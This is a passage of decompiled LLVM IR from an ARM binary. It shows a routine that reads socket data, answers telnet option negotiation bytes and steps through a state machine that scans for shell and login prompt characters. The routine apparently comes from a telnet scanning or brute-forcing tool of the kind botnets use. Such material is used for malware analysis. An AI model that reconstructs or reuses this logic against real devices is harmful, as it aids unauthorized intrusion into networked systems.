  br i1 %v3_123a8, label %dec_label_pc_123b4, label %dec_label_pc_125cc

dec_label_pc_123b4:                               ; preds = %dec_label_pc_12394
  %v0_123b4 = load i32, i32* @sb, align 4
  store i32 %v0_123b4, i32* %r0.global-to-local, align 4
  %v0_123b8 = load i32, i32* @r5, align 4
  %v1_123b8 = add i32 %v0_123b8, 24
  %v2_123b8 = inttoptr i32 %v1_123b8 to i32*
  %v3_123b8 = load i32, i32* %v2_123b8, align 4
  store i32 %v3_123b8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14534.380 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_123c4 = call i32 @function_13a60(i32 %v0_123b4, i32 %v3_123b8, i32 ptrtoint ([6 x i8]* @global_var_14534.380 to i32), i32 5)
  store i32 %v5_123c4, i32* %r0.global-to-local, align 4
  %v3_123c8 = icmp eq i32 %v5_123c4, -1
  store i1 %v3_123c8, i1* %cpsr_c.global-to-local, align 1
  %v8_123c8 = icmp eq i32 %v5_123c4, -1
  store i1 %v8_123c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_123c4, i32* @r7, align 4
  br i1 %v3_123c8, label %dec_label_pc_123d4.loopexit, label %dec_label_pc_125cc

dec_label_pc_123d4.loopexit:                      ; preds = %dec_label_pc_12568, %dec_label_pc_12aa8, %dec_label_pc_12458, %dec_label_pc_123b4, %dec_label_pc_12d84
  %v0_123d4 = load i32, i32* @r5, align 4
  %v1_123d4 = add i32 %v0_123d4, 12
  %v2_123d4 = inttoptr i32 %v1_123d4 to i32*
  %v3_123d4 = load i32, i32* %v2_123d4, align 4
  store i32 %v3_123d4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_123d8102 = icmp eq i32 %v3_123d4, 0
  store i1 %v2_123d8102, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123d8102, label %dec_label_pc_12270, label %dec_label_pc_123e0.lr.ph

dec_label_pc_123e0.lr.ph:                         ; preds = %dec_label_pc_123d4.preheader, %dec_label_pc_123d4.loopexit
  %v0_123e0134 = phi i32 [ %v0_123d4, %dec_label_pc_123d4.loopexit ], [ %v0_123d4103, %dec_label_pc_123d4.preheader ]
  br label %dec_label_pc_123e0

dec_label_pc_123d8thread-pre-split.thread:        ; preds = %dec_label_pc_127a0, %dec_label_pc_12854, %dec_label_pc_12908, %dec_label_pc_129bc, %dec_label_pc_12bc8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_123e0

dec_label_pc_123d8thread-pre-split:               ; preds = %dec_label_pc_127e8, %dec_label_pc_1289c, %dec_label_pc_12950, %dec_label_pc_12a04, %dec_label_pc_12c10, %dec_label_pc_12bf4, %dec_label_pc_12934, %dec_label_pc_129e8, %dec_label_pc_12880, %dec_label_pc_127cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_123e0

dec_label_pc_123e0:                               ; preds = %dec_label_pc_123d8thread-pre-split.thread, %dec_label_pc_123d8thread-pre-split, %dec_label_pc_123e0.lr.ph
  %v0_12dd0 = phi i32 [ %v0_123e0134, %dec_label_pc_123e0.lr.ph ], [ %v0_12458, %dec_label_pc_123d8thread-pre-split ], [ %v0_12458, %dec_label_pc_123d8thread-pre-split.thread ]
  %v1_123e0 = add i32 %v0_12dd0, 24
  %v2_123e0 = inttoptr i32 %v1_123e0 to i32*
  %v3_123e0 = load i32, i32* %v2_123e0, align 4
  store i32 %v3_123e0, i32* %r3.global-to-local, align 4
  %v2_123e4 = icmp ugt i32 %v3_123e0, 255
  store i1 %v2_123e4, i1* %cpsr_c.global-to-local, align 1
  %v7_123e4 = icmp eq i32 %v3_123e0, 256
  store i1 %v7_123e4, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_12dd0, 28
  store i32 %.pre, i32* @sb, align 4
  br i1 %v7_123e4, label %dec_label_pc_12dd0, label %dec_label_pc_123f0

dec_label_pc_123f0:                               ; preds = %dec_label_pc_123e0, %dec_label_pc_12dd0
  store i32 %v2_11ed0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %v0_11ed0, align 4
  %v0_123fc = load i32, i32* @r5, align 4
  %v1_123fc = add i32 %v0_123fc, 24
  %v2_123fc = inttoptr i32 %v1_123fc to i32*
  %v3_123fc = load i32, i32* %v2_123fc, align 4
  store i32 %v3_123fc, i32* %r2.global-to-local, align 4
  %v0_12400 = load i32, i32* @sb, align 4
  %v2_12400 = add i32 %v0_12400, %v3_123fc
  store i32 %v2_12400, i32* @r4, align 4
  %v1_12404 = add i32 %v0_123fc, 4
  %v2_12404 = inttoptr i32 %v1_12404 to i32*
  %v3_12404 = load i32, i32* %v2_12404, align 4
  store i32 %v3_12404, i32* %r0.global-to-local, align 4
  %v1_12408 = sub i32 256, %v3_123fc
  store i32 %v1_12408, i32* %r2.global-to-local, align 4
  store i32 %v2_12400, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_12414 = call i32 @_recv(i32 %v3_12404, i32 %v2_12400, i32 %v1_12408, i32 16384)
  store i32 %v4_12414, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12418 = icmp eq i32 %v4_12414, 0
  store i1 %v2_12418, i1* %cpsr_z.global-to-local, align 1
  %tmp319 = icmp slt i32 %v4_12414, 1
  br i1 %tmp319, label %dec_label_pc_12d28, label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %dec_label_pc_123f0
  %v0_12420 = load i32, i32* @r6, align 4
  store i32 %v0_12420, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %bb321, %dec_label_pc_12420
  %v3_12430 = phi i32 [ %v1_12434, %bb321 ], [ %v0_12420, %dec_label_pc_12420 ]
  %v1_12428 = load i32, i32* @r4, align 4
  %v2_12428 = add i32 %v1_12428, %v3_12430
  %v3_12428 = inttoptr i32 %v2_12428 to i8*
  %v4_12428 = load i8, i8* %v3_12428, align 1
  %v6_12428 = zext i8 %v4_12428 to i32
  store i32 %v6_12428, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1242c = icmp eq i8 %v4_12428, 0
  store i1 %v2_1242c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1242c, label %bb320, label %bb321

bb320:                                            ; preds = %dec_label_pc_12428
  %v1_12430 = load i32, i32* %r1.global-to-local, align 4
  %v2_12430 = trunc i32 %v1_12430 to i8
  store i8 %v2_12430, i8* %v3_12428, align 1
  %v0_12434.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb321

bb321:                                            ; preds = %dec_label_pc_12428, %bb320
  %v0_12434 = phi i32 [ %v3_12430, %dec_label_pc_12428 ], [ %v0_12434.pre, %bb320 ]
  %v1_12434 = add i32 %v0_12434, 1
  store i32 %v1_12434, i32* %r2.global-to-local, align 4
  %v3_12438 = icmp uge i32 %v4_12414, %v1_12434
  store i1 %v3_12438, i1* %cpsr_c.global-to-local, align 1
  %v9_12438 = icmp eq i32 %v4_12414, %v1_12434
  store i1 %v9_12438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12438, label %dec_label_pc_12440, label %dec_label_pc_12428

dec_label_pc_12440:                               ; preds = %bb321, %dec_label_pc_12d2c
  store i32 ptrtoint (i32* @global_var_1cd44.239 to i32), i32* %lr.global-to-local, align 4
  %v0_12444 = load i32, i32* @r5, align 4
  %v1_12444 = add i32 %v0_12444, 24
  %v2_12444 = inttoptr i32 %v1_12444 to i32*
  %v3_12444 = load i32, i32* %v2_12444, align 4
  %v2_12448 = load i32, i32* @global_var_1cd44.239, align 4
  store i32 %v2_12448, i32* %r3.global-to-local, align 4
  %v2_1244c = add i32 %v3_12444, %v4_12414
  store i32 %v2_1244c, i32* %ip.global-to-local, align 4
  store i32 %v2_1244c, i32* %v2_12444, align 4
  %v0_12454 = load i32, i32* %r3.global-to-local, align 4
  %v1_12454 = load i32, i32* @r5, align 4
  %v2_12454 = add i32 %v1_12454, 8
  %v3_12454 = inttoptr i32 %v2_12454 to i32*
  store i32 %v0_12454, i32* %v3_12454, align 4
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %dec_label_pc_12ba4, %dec_label_pc_12440
  %v0_12458 = load i32, i32* @r5, align 4
  %v1_12458 = add i32 %v0_12458, 12
  %v2_12458 = inttoptr i32 %v1_12458 to i32*
  %v3_12458 = load i32, i32* %v2_12458, align 4
  store i32 %v3_12458, i32* %r2.global-to-local, align 4
  %v1_1245c = add i32 %v3_12458, -2
  store i32 %v1_1245c, i32* %r3.global-to-local, align 4
  %v7_12460 = icmp eq i32 %v1_1245c, 8
  store i1 %v7_12460, i1* %cpsr_z.global-to-local, align 1
  %v5_12464 = and i32 %v1_1245c, 1073741824
  %v6_12464 = icmp ne i32 %v5_12464, 0
  store i1 %v6_12464, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_12458, label %dec_label_pc_123d4.loopexit [
    i32 2, label %dec_label_pc_12490
    i32 3, label %dec_label_pc_12578
    i32 4, label %dec_label_pc_12710
    i32 5, label %dec_label_pc_127a0
    i32 6, label %dec_label_pc_12854
    i32 7, label %dec_label_pc_129bc
    i32 8, label %dec_label_pc_12908
    i32 9, label %dec_label_pc_12bc8
    i32 10, label %dec_label_pc_12a70
  ]

dec_label_pc_12490:                               ; preds = %dec_label_pc_12458
  %v1_12494 = add i32 %v0_12458, 24
  %v2_12494 = inttoptr i32 %v1_12494 to i32*
  %v3_12494 = load i32, i32* %v2_12494, align 4
  store i32 %v3_12494, i32* %ip.global-to-local, align 4
  %v0_12498 = load i32, i32* @sb, align 4
  store i32 %v0_12498, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v1_124a4 = add i32 %v0_12458, 29
  store i32 %v1_124a4, i32* @r4, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  store i32 -4, i32* @r8, align 4
  %v3_124b093 = icmp eq i32 %v3_12494, 0
  store i1 %v3_124b093, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_124b093, i1* %cpsr_z.global-to-local, align 1
  %v6_124b4100 = icmp sgt i32 %v3_12494, 0
  br i1 %v6_124b4100, label %dec_label_pc_124b8.preheader, label %dec_label_pc_12558

dec_label_pc_124b0.loopexit:                      ; preds = %dec_label_pc_124d0
  %v2_124d8 = add i32 %v1_124d8, 2
  store i32 %v2_124d8, i32* @r6, align 4
  %v2_124dc = add i32 %v1_124dc, 2
  store i32 %v2_124dc, i32* @r4, align 4
  %v2_124e0 = add i32 %v1_124e0, 2
  store i32 %v2_124e0, i32* @r7, align 4
  %v3_124b0 = icmp uge i32 %v2_124e0, %v1_124b0
  store i1 %v3_124b0, i1* %cpsr_c.global-to-local, align 1
  %v9_124b0 = icmp eq i32 %v2_124e0, %v1_124b0
  store i1 %v9_124b0, i1* %cpsr_z.global-to-local, align 1
  %v6_124b4 = icmp slt i32 %v2_124e0, %v1_124b0
  br i1 %v6_124b4, label %dec_label_pc_124b8.preheader, label %dec_label_pc_12558

dec_label_pc_124b8.preheader:                     ; preds = %dec_label_pc_12490, %dec_label_pc_124b0.loopexit
  %v6_12560169 = phi i32 [ %v6_12560170, %dec_label_pc_124b0.loopexit ], [ %v0_12458, %dec_label_pc_12490 ]
  %v1_124e0159 = phi i32 [ %v2_124e0, %dec_label_pc_124b0.loopexit ], [ 0, %dec_label_pc_12490 ]
  %v1_124d8157 = phi i32 [ %v2_124d8, %dec_label_pc_124b0.loopexit ], [ %v0_12498, %dec_label_pc_12490 ]
  %v1_124c4155 = phi i32 [ %v1_124b0, %dec_label_pc_124b0.loopexit ], [ %v3_12494, %dec_label_pc_12490 ]
  %v0_124b8153 = phi i32 [ %v2_124dc, %dec_label_pc_124b0.loopexit ], [ %v1_124a4, %dec_label_pc_12490 ]
  br label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %dec_label_pc_124b8.preheader, %dec_label_pc_12538
  %v6_12560170 = phi i32 [ %v6_12560169, %dec_label_pc_124b8.preheader ], [ %v0_12540, %dec_label_pc_12538 ]
  %v1_124e0 = phi i32 [ %v1_124e0159, %dec_label_pc_124b8.preheader ], [ %v1_12544, %dec_label_pc_12538 ]
  %v1_124d8 = phi i32 [ %v1_124d8157, %dec_label_pc_124b8.preheader ], [ %v1_1254c, %dec_label_pc_12538 ]
  %v1_124b0 = phi i32 [ %v1_124c4155, %dec_label_pc_124b8.preheader ], [ %v3_12540, %dec_label_pc_12538 ]
  %v1_124dc = phi i32 [ %v0_124b8153, %dec_label_pc_124b8.preheader ], [ %v1_12550, %dec_label_pc_12538 ]
  %v1_124b8 = add i32 %v1_124dc, -1
  %v2_124b8 = inttoptr i32 %v1_124b8 to i8*
  %v3_124b8 = load i8, i8* %v2_124b8, align 1
  %v4_124b8 = zext i8 %v3_124b8 to i32
  store i32 %v4_124b8, i32* %r3.global-to-local, align 4
  %v2_124bc = icmp eq i8 %v3_124b8, -1
  store i1 %v2_124bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_124bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124bc, label %dec_label_pc_124c4, label %dec_label_pc_12558

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124b8
  %v0_124c4 = load i32, i32* @sb, align 4
  %v2_124c4 = add i32 %v0_124c4, %v1_124b0
  store i32 %v2_124c4, i32* %r2.global-to-local, align 4
  %v3_124c8 = icmp uge i32 %v2_124c4, %v1_124dc
  store i1 %v3_124c8, i1* %cpsr_c.global-to-local, align 1
  %v9_124c8 = icmp eq i32 %v2_124c4, %v1_124dc
  store i1 %v9_124c8, i1* %cpsr_z.global-to-local, align 1
  %v2_124cc = xor i1 %v3_124c8, true
  %v3_124cc = or i1 %v9_124c8, %v2_124cc
  br i1 %v3_124cc, label %dec_label_pc_12558, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124c4
  %v1_124d0 = inttoptr i32 %v1_124dc to i8*
  %v2_124d0 = load i8, i8* %v1_124d0, align 1
  %v3_124d0 = zext i8 %v2_124d0 to i32
  store i32 %v3_124d0, i32* %r3.global-to-local, align 4
  %v2_124d4 = icmp eq i8 %v2_124d0, -1
  store i1 %v2_124d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_124d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124d4, label %dec_label_pc_124b0.loopexit, label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124d0
  %v2_124e8 = icmp ugt i8 %v2_124d0, -4
  store i1 %v2_124e8, i1* %cpsr_c.global-to-local, align 1
  %v7_124e8 = icmp eq i8 %v2_124d0, -3
  store i1 %v7_124e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124e8, label %dec_label_pc_12c7c, label %dec_label_pc_124f0

dec_label_pc_124f0:                               ; preds = %dec_label_pc_124e8
  %v1_124f0 = add i32 %v1_124d8, 2
  store i32 %v1_124f0, i32* %r3.global-to-local, align 4
  %v3_124f4 = icmp uge i32 %v2_124c4, %v1_124f0
  store i1 %v3_124f4, i1* %cpsr_c.global-to-local, align 1
  %v9_124f4 = icmp eq i32 %v2_124c4, %v1_124f0
  store i1 %v9_124f4, i1* %cpsr_z.global-to-local, align 1
  %v2_124f8 = xor i1 %v3_124f4, true
  %v3_124f8 = or i1 %v9_124f4, %v2_124f8
  br i1 %v3_124f8, label %dec_label_pc_12558, label %dec_label_pc_124fc

dec_label_pc_124fc:                               ; preds = %bb351, %dec_label_pc_12cd0, %bb350, %dec_label_pc_124f0
  %v0_124fc = load i32, i32* @r4, align 4
  %v1_124fc = inttoptr i32 %v0_124fc to i8*
  %v2_124fc = load i8, i8* %v1_124fc, align 1
  %v3_124fc = zext i8 %v2_124fc to i32
  store i32 %v3_124fc, i32* %r3.global-to-local, align 4
  %v2_12500 = icmp ugt i8 %v2_124fc, -4
  store i1 %v2_12500, i1* %cpsr_c.global-to-local, align 1
  %v7_12500 = icmp eq i8 %v2_124fc, -3
  store i1 %v7_12500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12500, label %bb322, label %dec_label_pc_1250c

bb322:                                            ; preds = %dec_label_pc_124fc
  %v1_12504 = load i32, i32* @r8, align 4
  %v2_12504 = trunc i32 %v1_12504 to i8
  store i8 %v2_12504, i8* %v1_124fc, align 1
  %v0_12508.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12508.pr, label %bb324, label %.dec_label_pc_1250c_crit_edge

.dec_label_pc_1250c_crit_edge:                    ; preds = %bb322
  %v0_1250c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1250c

dec_label_pc_1250c:                               ; preds = %.dec_label_pc_1250c_crit_edge, %dec_label_pc_124fc
  %v0_1250c = phi i32 [ %v0_1250c.pre, %.dec_label_pc_1250c_crit_edge ], [ %v3_124fc, %dec_label_pc_124fc ]
  %v2_1250c = icmp ugt i32 %v0_1250c, 250
  store i1 %v2_1250c, i1* %cpsr_c.global-to-local, align 1
  %v7_1250c = icmp eq i32 %v0_1250c, 251
  store i1 %v7_1250c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1250c, label %bb323, label %bb324

bb323:                                            ; preds = %dec_label_pc_1250c
  %v1_12510 = load i32, i32* %sl.global-to-local, align 4
  %v2_12510 = trunc i32 %v1_12510 to i8
  %v3_12510 = load i32, i32* @r4, align 4
  %v4_12510 = inttoptr i32 %v3_12510 to i8*
  store i8 %v2_12510, i8* %v4_12510, align 1
  br label %bb324

bb324:                                            ; preds = %bb322, %dec_label_pc_1250c, %bb323
  %v0_12514 = load i32, i32* @r4, align 4
  %v1_12514 = add i32 %v0_12514, 1
  %v2_12514 = inttoptr i32 %v1_12514 to i8*
  %v3_12514 = load i8, i8* %v2_12514, align 1
  %v4_12514 = zext i8 %v3_12514 to i32
  store i32 %v4_12514, i32* %r3.global-to-local, align 4
  %v2_12518 = icmp ugt i8 %v3_12514, -4
  store i1 %v2_12518, i1* %cpsr_c.global-to-local, align 1
  %v7_12518 = icmp eq i8 %v3_12514, -3
  store i1 %v7_12518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12518, label %bb325, label %dec_label_pc_12524

bb325:                                            ; preds = %bb324
  %v1_1251c = load i32, i32* @r8, align 4
  %v2_1251c = trunc i32 %v1_1251c to i8
  store i8 %v2_1251c, i8* %v2_12514, align 1
  %v0_12520.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12520.pr, label %bb327, label %.dec_label_pc_12524_crit_edge

.dec_label_pc_12524_crit_edge:                    ; preds = %bb325
  %v0_12524.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %.dec_label_pc_12524_crit_edge, %bb324
  %v0_12524 = phi i32 [ %v0_12524.pre, %.dec_label_pc_12524_crit_edge ], [ %v4_12514, %bb324 ]
  %v2_12524 = icmp ugt i32 %v0_12524, 250
  store i1 %v2_12524, i1* %cpsr_c.global-to-local, align 1
  %v7_12524 = icmp eq i32 %v0_12524, 251
  store i1 %v7_12524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12524, label %bb326, label %bb327

bb326:                                            ; preds = %dec_label_pc_12524
  %v1_12528 = load i32, i32* %sl.global-to-local, align 4
  %v2_12528 = trunc i32 %v1_12528 to i8
  %v3_12528 = load i32, i32* @r4, align 4
  %v4_12528 = add i32 %v3_12528, 1
  %v5_12528 = inttoptr i32 %v4_12528 to i8*
  store i8 %v2_12528, i8* %v5_12528, align 1
  br label %bb327

bb327:                                            ; preds = %bb325, %dec_label_pc_12524, %bb326
  %v0_1252c = load i32, i32* @r5, align 4
  %v1_1252c = add i32 %v0_1252c, 4
  %v2_1252c = inttoptr i32 %v1_1252c to i32*
  %v3_1252c = load i32, i32* %v2_1252c, align 4
  store i32 %v3_1252c, i32* %r0.global-to-local, align 4
  %v0_12530 = load i32, i32* @r6, align 4
  br label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %dec_label_pc_12da8, %bb327
  %storemerge7 = phi i32 [ %v2_12c94, %dec_label_pc_12da8 ], [ %v0_12530, %bb327 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_12da8 ], [ 3, %bb327 ]
  store i32 %storemerge7, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1253c = inttoptr i32 %storemerge7 to i32*
  %v5_1253c = call i32 @send(i32 16384, i32* %v4_1253c, i32 %storemerge, i32 16384)
  store i32 %v5_1253c, i32* %r0.global-to-local, align 4
  %v0_12540 = load i32, i32* @r5, align 4
  %v1_12540 = add i32 %v0_12540, 24
  %v2_12540 = inttoptr i32 %v1_12540 to i32*
  %v3_12540 = load i32, i32* %v2_12540, align 4
  store i32 %v3_12540, i32* %ip.global-to-local, align 4
  %v0_12544 = load i32, i32* @r7, align 4
  %v1_12544 = add i32 %v0_12544, 3
  store i32 %v1_12544, i32* @r7, align 4
  %v3_12548 = icmp uge i32 %v1_12544, %v3_12540
  store i1 %v3_12548, i1* %cpsr_c.global-to-local, align 1
  %v9_12548 = icmp eq i32 %v1_12544, %v3_12540
  store i1 %v9_12548, i1* %cpsr_z.global-to-local, align 1
  %v0_1254c = load i32, i32* @r6, align 4
  %v1_1254c = add i32 %v0_1254c, 3
  store i32 %v1_1254c, i32* @r6, align 4
  %v0_12550 = load i32, i32* @r4, align 4
  %v1_12550 = add i32 %v0_12550, 3
  store i32 %v1_12550, i32* @r4, align 4
  %v5_12554 = icmp slt i32 %v1_12544, %v3_12540
  br i1 %v5_12554, label %dec_label_pc_124b8, label %dec_label_pc_12558

dec_label_pc_12558:                               ; preds = %dec_label_pc_124b0.loopexit, %dec_label_pc_124b8, %dec_label_pc_12538, %dec_label_pc_124f0, %dec_label_pc_124c4, %dec_label_pc_12490, %dec_label_pc_12c7c.dec_label_pc_12558.loopexit_crit_edge
  %v6_12560 = phi i32 [ %v0_12ca0, %dec_label_pc_12c7c.dec_label_pc_12558.loopexit_crit_edge ], [ %v0_12458, %dec_label_pc_12490 ], [ %v6_12560170, %dec_label_pc_124b8 ], [ %v0_12540, %dec_label_pc_12538 ], [ %v6_12560170, %dec_label_pc_124f0 ], [ %v6_12560170, %dec_label_pc_124c4 ], [ %v6_12560170, %dec_label_pc_124b0.loopexit ]
  %v0_12568.pre = phi i32 [ %v0_12558.pre.pre, %dec_label_pc_12c7c.dec_label_pc_12558.loopexit_crit_edge ], [ 0, %dec_label_pc_12490 ], [ %v1_124e0, %dec_label_pc_124b8 ], [ %v1_12544, %dec_label_pc_12538 ], [ %v1_124e0, %dec_label_pc_124f0 ], [ %v1_124e0, %dec_label_pc_124c4 ], [ %v2_124e0, %dec_label_pc_124b0.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12558 = icmp eq i32 %v0_12568.pre, 0
  store i1 %v2_12558, i1* %cpsr_z.global-to-local, align 1
  %tmp328 = icmp slt i32 %v0_12568.pre, 1
  br i1 %tmp328, label %dec_label_pc_12568, label %.thread205

.thread205:                                       ; preds = %dec_label_pc_12558
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_12560 = add i32 %v6_12560, 12
  %v8_12560 = inttoptr i32 %v7_12560 to i32*
  store i32 3, i32* %v8_12560, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12568:                               ; preds = %dec_label_pc_12558, %dec_label_pc_12c1c, %dec_label_pc_12af4, %dec_label_pc_12a10, %dec_label_pc_1295c, %dec_label_pc_128a8, %dec_label_pc_127f4, %dec_label_pc_1275c, %dec_label_pc_125cc
  %v0_12568 = phi i32 [ %v1_12c10, %dec_label_pc_12c1c ], [ %v0_12aec, %dec_label_pc_12af4 ], [ %v1_12a04, %dec_label_pc_12a10 ], [ %v1_12950, %dec_label_pc_1295c ], [ %v1_1289c, %dec_label_pc_128a8 ], [ %v1_127e8, %dec_label_pc_127f4 ], [ %v0_1275c, %dec_label_pc_1275c ], [ %v0_125cc, %dec_label_pc_125cc ], [ %v0_12568.pre, %dec_label_pc_12558 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12568 = icmp eq i32 %v0_12568, 0
  store i1 %v2_12568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12568, label %dec_label_pc_123d4.loopexit, label %dec_label_pc_12570

dec_label_pc_12570:                               ; preds = %dec_label_pc_12568
  %v0_12570 = load i32, i32* @r5, align 4
  %v1_12570 = add i32 %v0_12570, 24
  %v2_12570 = inttoptr i32 %v1_12570 to i32*
  %v3_12570 = load i32, i32* %v2_12570, align 4
  store i32 %v3_12570, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12578:                               ; preds = %dec_label_pc_12458
  %v1_12578 = add i32 %v0_12458, 24
  %v2_12578 = inttoptr i32 %v1_12578 to i32*
  %v3_12578 = load i32, i32* %v2_12578, align 4
  store i32 %v3_12578, i32* %ip.global-to-local, align 4
  %v1_1257c = add i32 %v3_12578, -1
  store i32 %v1_1257c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12580 = icmp eq i32 %v1_1257c, 0
  store i1 %v2_12580, i1* %cpsr_z.global-to-local, align 1
  %v5_12584 = icmp sgt i32 %v1_1257c, 0
  br i1 %v5_12584, label %dec_label_pc_125ac, label %dec_label_pc_12394

dec_label_pc_1258c:                               ; preds = %bb329
  %v2_1258c = icmp ugt i8 %v3_125b0, 35
  store i1 %v2_1258c, i1* %cpsr_c.global-to-local, align 1
  %v7_1258c = icmp eq i8 %v3_125b0, 36
  store i1 %v7_1258c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1258c, label %dec_label_pc_125c0, label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %dec_label_pc_1258c
  %v2_12594 = icmp ugt i8 %v3_125b0, 34
  store i1 %v2_12594, i1* %cpsr_c.global-to-local, align 1
  %v7_12594 = icmp eq i8 %v3_125b0, 35
  store i1 %v7_12594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12594, label %dec_label_pc_125c0, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12594
  %v2_1259c = icmp ugt i8 %v3_125b0, 36
  store i1 %v2_1259c, i1* %cpsr_c.global-to-local, align 1
  %v7_1259c = icmp eq i8 %v3_125b0, 37
  store i1 %v7_1259c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1259c, label %dec_label_pc_125c0, label %dec_label_pc_125a4

dec_label_pc_125a4:                               ; preds = %dec_label_pc_1259c
  %v1_125a4 = add i32 %v0_125c0, -1
  store i32 %v1_125a4, i32* %r0.global-to-local, align 4
  %v2_125a4 = icmp ne i32 %v0_125c0, 0
  store i1 %v2_125a4, i1* %cpsr_c.global-to-local, align 1
  %v7_125a4 = icmp eq i32 %v0_125c0, 1
  store i1 %v7_125a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125a4, label %dec_label_pc_12394, label %dec_label_pc_125ac

dec_label_pc_125ac:                               ; preds = %dec_label_pc_12578, %dec_label_pc_125a4
  %v0_125c0 = phi i32 [ %v1_125a4, %dec_label_pc_125a4 ], [ %v1_1257c, %dec_label_pc_12578 ]
  %v2_125ac = add i32 %v0_125c0, %v0_12458
  store i32 %v2_125ac, i32* %r3.global-to-local, align 4
  %v1_125b0 = add i32 %v2_125ac, 28
  %v2_125b0 = inttoptr i32 %v1_125b0 to i8*
  %v3_125b0 = load i8, i8* %v2_125b0, align 1
  %v4_125b0 = zext i8 %v3_125b0 to i32
  store i32 %v4_125b0, i32* %r3.global-to-local, align 4
  %v2_125b4 = icmp ugt i8 %v3_125b0, 61
  store i1 %v2_125b4, i1* %cpsr_c.global-to-local, align 1
  %v7_125b4 = icmp eq i8 %v3_125b0, 62
  store i1 %v7_125b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125b4, label %dec_label_pc_125c0, label %bb329

bb329:                                            ; preds = %dec_label_pc_125ac
  %v3_125b8 = icmp ugt i8 %v3_125b0, 57
  store i1 %v3_125b8, i1* %cpsr_c.global-to-local, align 1
  %v8_125b8 = icmp eq i8 %v3_125b0, 58
  store i1 %v8_125b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_125b8, label %dec_label_pc_125c0, label %dec_label_pc_1258c

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125ac, %bb329, %dec_label_pc_1259c, %dec_label_pc_12594, %dec_label_pc_1258c
  %v1_125c0 = add i32 %v0_125c0, 1
  store i32 %v1_125c0, i32* @r7, align 4
  %v2_125c4 = icmp eq i32 %v1_125c0, -1
  store i1 %v2_125c4, i1* %cpsr_c.global-to-local, align 1
  %v7_125c4 = icmp eq i32 %v0_125c0, -2
  store i1 %v7_125c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125c4, label %dec_label_pc_12394, label %dec_label_pc_125cc

dec_label_pc_125cc:                               ; preds = %dec_label_pc_125c0, %dec_label_pc_123b4, %dec_label_pc_12394
  %v0_125cc = phi i32 [ %v5_123c4, %dec_label_pc_123b4 ], [ %v5_123a4, %dec_label_pc_12394 ], [ %v1_125c0, %dec_label_pc_125c0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_125cc = icmp eq i32 %v0_125cc, 0
